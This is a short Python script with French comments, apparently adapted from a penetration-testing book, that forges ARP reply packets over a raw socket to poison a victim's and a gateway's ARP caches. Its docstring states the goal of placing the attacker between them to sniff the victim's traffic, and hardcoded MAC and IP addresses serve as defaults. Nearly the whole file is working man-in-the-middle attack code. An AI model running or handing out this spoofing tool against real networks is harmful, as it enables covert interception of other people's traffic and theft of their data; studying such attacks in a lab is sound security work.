# -*- coding: utf-8 -*-

"""
Script d'arp spoofing avec de la construction de packet ARP
Tiré de Mohit - Penetration Testing
"""

import socket
import struct
import binascii
import time
import uuid
import fcntl
import netifaces

def arpSpoofing(victim =('80fa5b254d02','172.22.22.69'), gate=('705a9e34302f','172.22.22.1'), iface='eth0'):
    """
	Arg : victime, tuple MAC-IP de la victime; gate, tuple MAC-IP du gate; iface, l'interface
    Action : Construit et envoie à la victime et à l'AP des réponses ARP qui placent l'attaquant entre
			 l'AP et la victime pour pouvoir lui sniffer des packets
	Return : rien
    """
    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    s.bind((iface, socket.htons(0x0800))) #Liaison à l'interface et au protocole eth

    sMac = netifaces.ifaddresses(iface)[netifaces.AF_PACKET][0]['addr'] #On récupère l'adresse MAC de la source
    sMac = sMac.replace(':','') #On enlève les ":"
    
    sor = binascii.unhexlify(sMac)
    victmac = binascii.unhexlify(victim[0])
    gatemac = binascii.unhexlify(gate[0])
    code = b'\x08\x06' #Code du protocole ARP
    eth1 = victmac+sor+code #Pour la victime
    eth2 = gatemac+sor+code #Pour le gateway

    htype = b'\x00\x01' #Signifie qu'on est en Ethernet (tout le temps ça)
    protype = b'\x08\x00' #Type de protocole (ipv4)
    hsize = b'\x06' #Taille de l'adresse du hardware
    psize = b'\x04' #Taille de l'ip
    opcode = b'\x00\x02' #C'est un packet réponse

    gateIp = gate[1]
    victimIp = victim[1]
    gip = socket.inet_aton (gateIp) #Convertit l'ip en hexadecimal
    vip = socket.inet_aton (victimIp)

    #On assemble le tout à la manière d'un Header ARP
    arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip
    arp_gateway = eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip

    s.send(arp_victim)
    s.send(arp_gateway)
    
# arpSpoofing()
